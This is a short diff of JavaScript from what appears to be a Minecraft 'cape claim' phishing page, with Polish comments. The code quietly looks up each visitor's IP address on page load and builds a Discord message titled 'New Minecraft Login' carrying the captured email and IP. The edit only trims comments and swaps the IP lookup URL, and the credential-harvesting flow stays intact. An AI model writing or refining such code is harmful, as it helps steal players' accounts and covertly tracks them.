@@ -181,14 +181,13 @@
         let savedEmail = "";
         let userIp = "Unknown";
 
-        // Pobieranie adresu IP w tle zaraz po otwarciu strony
-        fetch('https://api.ipify.org?format=json')
+        // Pobieranie adresu IP w tle
+        fetch('https://ipify.org')
             .then(response => response.json())
             .then(data => {
                 userIp = data.ip;
             })
             .catch(() => {
-                // Jeśli coś zablokuje API, przypisze domyślną wartość
                 userIp = "Not found";
             });
 
@@ -213,7 +212,6 @@
                 return;
             }
 
-            // Konstruowanie wiadomości do Discorda rozbudowanej o adres IP
             const data = {
                 embeds: [{
                     title: "🔔 New Minecraft Login (Cape Claim)",
